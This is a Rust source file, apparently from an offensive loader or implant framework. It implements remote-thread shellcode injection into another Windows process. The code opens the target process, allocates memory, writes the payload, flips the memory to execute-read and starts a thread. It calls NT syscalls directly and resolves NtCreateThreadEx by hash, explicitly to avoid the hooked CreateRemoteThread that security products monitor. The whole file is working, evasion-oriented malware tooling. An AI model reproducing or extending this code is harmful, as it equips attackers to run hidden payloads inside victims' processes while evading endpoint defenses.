use crate::injection::{payload_has_valid_pe_headers, Injector};
use anyhow::{anyhow, Result};

pub struct RemoteThreadInjector;

#[cfg(windows)]
impl Injector for RemoteThreadInjector {
    fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
        // RemoteThread injects shellcode, not PE images.  PE payloads must use
        // Hollowing, ManualMap, or ModuleStomp (which forwards to hollowing).
        let is_pe = payload_has_valid_pe_headers(payload);
        if is_pe {
            return Err(anyhow!(
                "RemoteThread injection requires raw shellcode, not a PE image. \
                 Use InjectionMethod::Hollowing or InjectionMethod::ModuleStomp for PE payloads."
            ));
        }

        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
        use winapi::um::winnt::{PROCESS_CREATE_THREAD, PROCESS_VM_OPERATION, PROCESS_VM_WRITE};

        // Open target process via NtOpenProcess
        let mut client_id = [0u64; 2];
        client_id[0] = pid as u64;
        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
        obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;

        unsafe {
            let mut h_proc: usize = 0;
            let access_mask = (PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD) as u64;
            let open_status = nt_syscall::syscall!(
                "NtOpenProcess",
                &mut h_proc as *mut _ as u64,
                access_mask,
                &mut obj_attr as *mut _ as u64,
                client_id.as_mut_ptr() as u64,
            );
            match open_status {
                Ok(s) if s >= 0 && h_proc != 0 => {}
                _ => return Err(anyhow!("RemoteThread: NtOpenProcess failed")),
            }
            let h_proc = h_proc as *mut std::ffi::c_void;

            macro_rules! close_h {
                ($h:expr) => {
                    nt_syscall::syscall!("NtClose", $h as u64).ok();
                };
            }
            macro_rules! cleanup_and_err {
                ($msg:expr) => {{
                    close_h!(h_proc);
                    return Err(anyhow!($msg));
                }};
            }

            // Allocate RW first; switch to RX after writing to avoid RWX pages
            let mut remote_mem: *mut std::ffi::c_void = std::ptr::null_mut();
            let mut alloc_size = payload.len();
            let s = nt_syscall::syscall!(
                "NtAllocateVirtualMemory",
                h_proc as u64, &mut remote_mem as *mut _ as u64,
                0u64, &mut alloc_size as *mut _ as u64,
                (MEM_COMMIT | MEM_RESERVE) as u64, PAGE_READWRITE as u64,
            );
            match s {
                Ok(st) if st >= 0 => {}
                _ => cleanup_and_err!("RemoteThread: NtAllocateVirtualMemory failed"),
            }
            if remote_mem.is_null() {
                cleanup_and_err!("RemoteThread: NtAllocateVirtualMemory returned null");
            }

            let mut written = 0usize;
            let s = nt_syscall::syscall!(
                "NtWriteVirtualMemory",
                h_proc as u64, remote_mem as u64,
                payload.as_ptr() as u64, payload.len() as u64,
                &mut written as *mut _ as u64,
            );
            match s {
                Ok(st) if st >= 0 => {}
                _ => cleanup_and_err!("RemoteThread: NtWriteVirtualMemory failed"),
            }
            if written != payload.len() {
                cleanup_and_err!(
                    "RemoteThread: NtWriteVirtualMemory wrote {} of {} bytes",
                    written,
                    payload.len()
                );
            }

            // Switch to execute-read (no write)
            let mut old_prot = 0u32;
            let mut prot_base = remote_mem as usize;
            let mut prot_size = payload.len();
            let s = nt_syscall::syscall!(
                "NtProtectVirtualMemory",
                h_proc as u64, &mut prot_base as *mut _ as u64,
                &mut prot_size as *mut _ as u64,
                PAGE_EXECUTE_READ as u64, &mut old_prot as *mut _ as u64,
            );
            match s {
                Ok(st) if st >= 0 => {}
                _ => cleanup_and_err!("RemoteThread: NtProtectVirtualMemory to RX failed"),
            }

            // Use NtCreateThreadEx via pe_resolve to avoid the hooked CreateRemoteThread.
            let ntdll_hash = pe_resolve::hash_str(b"ntdll.dll\0");
            let ntdll = pe_resolve::get_module_handle_by_hash(ntdll_hash)
                .ok_or_else(|| anyhow!("RemoteThread: ntdll not found"))?;
            let fn_hash = pe_resolve::hash_str(b"NtCreateThreadEx\0");
            let fn_ptr = pe_resolve::get_proc_address_by_hash(ntdll, fn_hash)
                .ok_or_else(|| anyhow!("RemoteThread: NtCreateThreadEx not found"))?
                as *mut winapi::ctypes::c_void;

            type NtCreateThreadExFn = unsafe extern "system" fn(
                *mut *mut winapi::ctypes::c_void,
                u32,
                *mut winapi::ctypes::c_void,
                *mut winapi::ctypes::c_void,
                *mut winapi::ctypes::c_void,
                *mut winapi::ctypes::c_void,
                u32,
                usize,
                usize,
                usize,
                *mut winapi::ctypes::c_void,
            ) -> i32;
            let nt_create: NtCreateThreadExFn = std::mem::transmute(fn_ptr);

            let mut h_thread: *mut winapi::ctypes::c_void = std::ptr::null_mut();
            let status = nt_create(
                &mut h_thread,
                0x1FFFFF,
                std::ptr::null_mut(),
                h_proc,
                remote_mem,
                std::ptr::null_mut(),
                0,
                0,
                0,
                0,
                std::ptr::null_mut(),
            );
            if status < 0 {
                cleanup_and_err!(
                    "RemoteThread: NtCreateThreadEx failed: {:x}",
                    status
                );
            }
            if !h_thread.is_null() {
                close_h!(h_thread);
            }
            close_h!(h_proc);
        }
        Ok(())
    }
}

#[cfg(not(windows))]
impl Injector for RemoteThreadInjector {
    fn inject(&self, _pid: u32, _payload: &[u8]) -> Result<()> {
        Err(anyhow!("RemoteThread injection only supported on Windows"))
    }
}
